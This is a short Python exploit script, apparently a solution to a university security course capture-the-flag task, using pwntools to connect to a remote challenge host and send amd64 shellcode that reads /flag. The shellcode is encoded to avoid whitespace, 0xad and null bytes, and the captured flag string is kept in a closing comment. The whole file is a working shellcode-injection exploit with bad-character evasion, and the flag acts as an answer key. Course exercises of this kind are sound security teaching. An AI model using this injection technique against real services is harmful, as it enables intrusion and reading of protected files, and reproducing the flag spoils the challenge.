from pwn import *
import string
from sys import argv
import os
import time


context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'


# start remote
p = remote('tasks.ws24.softsec.rub.de', 32855)

# start locally with docker
#p = remote('127.0.0.1', 1024)


# payload reading the flag
payload = asm(shellcraft.amd64.linux.cat("/flag", fd=1))
# remove bad characters
payload = encoder.encode(payload, avoid=string.whitespace.encode()+b'\xad\x00').hex().encode()

p.sendline(payload)

# see outputted flag
p.interactive()

#softsec{tDGMGmR7C8MrL67MvQxAhkrXlSeo_VMoizwsotLkwxhkgSe8o2i4EZqdzh53r3kc}